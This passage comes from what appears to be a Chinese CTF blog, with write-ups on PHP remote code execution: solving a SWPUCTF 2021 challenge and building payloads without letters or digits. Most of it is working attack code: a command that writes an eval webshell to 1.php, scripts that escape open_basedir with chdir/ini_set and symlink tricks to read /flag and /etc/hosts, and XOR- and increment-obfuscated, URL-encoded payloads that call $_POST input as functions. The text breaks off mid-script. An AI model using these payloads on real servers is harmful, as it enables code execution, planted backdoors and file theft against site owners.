class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">24</span>____%<span class="number">3</span>B%<span class="number">24</span>___(%<span class="number">24</span>_%<span class="number">5</span>B_%<span class="number">5</span>D)%<span class="number">3</span>B	</span><br><span class="line"><span class="comment"># assert($_POST[_])</span></span><br><span class="line"><span class="comment"># post _=file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>访问<code>1.php</code>  执行phpinfo发现system, exec等函数都被禁用  并且设置了<code>open_basedir</code></p>
<p>绕过payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>); <span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;test&#x27;</span>); <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;test&#x27;</span>); <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>); <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>); <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>); <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>); <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>); <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>); <span class="keyword">print</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<h2 id="open-basedir绕过脚本"><a href="#open-basedir绕过脚本" class="headerlink" title="open_basedir绕过脚本"></a>open_basedir绕过脚本</h2><p>获取目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    <span class="variable">$dir_array</span> = <span class="keyword">array</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$dir</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$d</span>)&#123;</span><br><span class="line">        <span class="variable">$dir_array</span>[] = <span class="variable">$d</span>-&gt;<span class="title function_ invoke__">__toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$dir</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///.*&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$d</span>)&#123;</span><br><span class="line">        <span class="variable">$dir_array</span>[] = <span class="variable">$d</span>-&gt;<span class="title function_ invoke__">__toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">sort</span>(<span class="variable">$dir_array</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$dir_array</span> <span class="keyword">as</span> <span class="variable">$d</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$d</span>.<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$dir_array</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$d</span>)&#123;</span><br><span class="line">    <span class="variable">$dir_array</span>[] = <span class="variable">$d</span>-&gt;<span class="title function_ invoke__">__toString</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&#x27;glob:///.*&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$d</span>)&#123;</span><br><span class="line">    <span class="variable">$dir_array</span>[] = <span class="variable">$d</span>-&gt;<span class="title function_ invoke__">__toString</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">sort</span>(<span class="variable">$dir_array</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir_array</span> <span class="keyword">as</span> <span class="variable">$d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$d</span>.<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>读取文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/etc/hosts&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;1&quot;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;2&quot;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;3&quot;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;3&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;4&quot;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;4&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">symlink</span>(<span class="string">&quot;1/2/3/4&quot;</span>,<span class="string">&quot;tmplink&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">symlink</span>(<span class="string">&quot;tmplink/../../../../etc/hosts&quot;</span>,<span class="string">&quot;bypass&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&quot;tmplink&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;tmplink&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;bypass&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/09/26/SWPUCTF2021-hardrce3-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/09/24/rce-noalpha/" >无字母RCE</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-09-24
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>借助异或构造payload如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$__</span>=(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>); <span class="comment">// _</span></span><br><span class="line"><span class="variable">$__</span>.=(<span class="string">&quot;.&quot;</span>^<span class="string">&quot;~&quot;</span>); <span class="comment">// _P</span></span><br><span class="line"><span class="variable">$__</span>.=(<span class="string">&quot;/&quot;</span>^<span class="string">&quot;`&quot;</span>); <span class="comment">// _PO</span></span><br><span class="line"><span class="variable">$__</span>.=(<span class="string">&quot;|&quot;</span>^<span class="string">&quot;/&quot;</span>); <span class="comment">// _POS</span></span><br><span class="line"><span class="variable">$__</span>.=(<span class="string">&quot;&#123;&quot;</span>^<span class="string">&quot;/&quot;</span>); <span class="comment">// _POST </span></span><br><span class="line"><span class="variable">$$__</span>[_](<span class="variable">$$__</span>[__]); <span class="comment">// $_POST[_]($_POST[__]);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者构造eval($_POST[_]), assert($_POST[_])</span></span><br><span class="line"><span class="comment">// assert($_POST[_])</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span>).(<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span>).(<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);&amp;_=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>

<p>然后我们再取消一下换行符，将它合并于一行之中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$__</span>=(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>);<span class="variable">$__</span>.=(<span class="string">&quot;.&quot;</span>^<span class="string">&quot;~&quot;</span>);<span class="variable">$__</span>.=(<span class="string">&quot;/&quot;</span>^<span class="string">&quot;`&quot;</span>);<span class="variable">$__</span>.=(<span class="string">&quot;|&quot;</span>^<span class="string">&quot;/&quot;</span>);<span class="variable">$__</span>.=(<span class="string">&quot;&#123;&quot;</span>^<span class="string">&quot;/&quot;</span>);<span class="variable">$$__</span>[_](<span class="variable">$$__</span>[__]);	<span class="comment">// $_POST[_]($_POST[__]);</span></span><br></pre></td></tr></table></figure>

<p>最后进行一次URL编码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=%<span class="number">24</span>__%<span class="number">3</span>D(%<span class="number">22</span>%<span class="number">23</span>%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">7</span>C%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">24</span>__.%<span class="number">3</span>D(%<span class="number">22</span>.%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>~%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">24</span>__.%<span class="number">3</span>D(%<span class="number">22</span>%<span class="number">2</span>F%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">60</span>%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">24</span>__.%<span class="number">3</span>D(%<span class="number">22</span>%<span class="number">7</span>C%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">2</span>F%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">24</span>__.%<span class="number">3</span>D(%<span class="number">22</span>%<span class="number">7</span>B%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">2</span>F%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">24</span>__%<span class="number">5</span>B_%<span class="number">5</span>D(%<span class="number">24</span>%<span class="number">24</span>__%<span class="number">5</span>B__%<span class="number">5</span>D)%<span class="number">3</span>B</span><br></pre></td></tr></table></figure>

<p>或者直接多个字符一起异或，根据未过滤字符构造目标脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">valid = <span class="string">&quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span>	<span class="comment"># 没有被过滤的字符</span></span><br><span class="line"> </span><br><span class="line">answer = <span class="string">&quot;phpinfo&quot;</span></span><br><span class="line"> </span><br><span class="line">tmp1,tmp2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> answer:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> valid:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> valid:</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j) == <span class="built_in">ord</span>(c)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;&quot;<span class="subst">&#123;tmp1&#125;</span>&quot;^&quot;<span class="subst">&#123;tmp2&#125;</span>&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &quot;0302181&quot;^&quot;@[@[_^^&quot;</span></span><br><span class="line"><span class="comment"># $_=&quot;0302181&quot;^&quot;@[@[_^^&quot;;$_();</span></span><br></pre></td></tr></table></figure>

<h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>官方文档如下<br><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.operators.increment.php">https://www.php.net/manual/zh/language.operators.increment.php</a></p>
<blockquote>
<p>当我们通过某种方法可以得到一个字符时，我们就可以通过自增来获取其他字符，比如现在我们获取到了<code>$_=A</code>，我们进行<code>$_++</code>，此时<code>$_</code>就变成了<code>B</code>，同理就可以构造出<code>GET</code>以及<code>POST</code>字符，接下来以例子来进行讲解,这里例题的话还用之前的demo在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 <code>$a = &#39;Z&#39;; $a++;</code> 将把 <code>$a</code> 变成<code>&#39;AA&#39;</code>，而在 C 中，<code>a = &#39;Z&#39;; a++;</code> 将把 <code>a</code> 变成 <code>&#39;[&#39;</code>（<code>&#39;Z&#39;</code> 的 ASCII 值是 90，<code>&#39;[&#39;</code> 的 ASCII 值是 91）。注意字符变量只能递增，不能递减，并且只支持纯 ASCII 字母数字（a-z、A-Z 和 0-9）。递增&#x2F;递减其他字符变量则无效，原字符串没有变化。</p>
</blockquote>
<p>我们首先可以写一个<code>[]</code>看一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_</span>);</span><br></pre></td></tr></table></figure>

<p>可以看到它就是一个数组，我们无法获取它的这个<code>Array</code>字符，那我们该怎么获取呢，我们尝试字符拼接</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_</span>);</span><br><span class="line"><span class="comment">// Array</span></span><br></pre></td></tr></table></figure>

<p>成功获取到了字符<code>Array</code>，然后我们获取想获取A的话，就可以采用<code>$_[0]</code>这种方式来获取，但我们是不能够写数字的，所以我们这里可以用一个判断,比如我们在<code>[]</code>里加一个<code>==$</code>，此时因为<code>空</code>和<code>$</code>不同，它就会输出<code>0</code>，此时也就等同于<code>$_[0]</code>，在有些版本中<code>[]</code>中间为非数字字符也会被当做下标0</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];	<span class="comment">// 或 $_=$_[_];</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;</span><br><span class="line"><span class="comment">// A</span></span><br></pre></td></tr></table></figure>

<p>此时成功获取到了字符<code>A</code>，有了<code>A</code>，我们就可以通过自增依次获取其他字符，我们尝试获取一个字符<code>G</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];<span class="comment">// Array</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];<span class="comment">// A</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_</span>); <span class="comment">// G</span></span><br></pre></td></tr></table></figure>

<p>然后看我们这里的代码的话，是<code>eval($code)</code>，所以我们就可以构造这种的<code>$_GET[1]($_GET[0])</code>，这个时候我们就可以<code>system(ls)</code>这种命令的执行，所以接下来的话就开始构造</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;<span class="comment">//Array</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];<span class="comment">//A</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//F</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//G</span></span><br><span class="line"><span 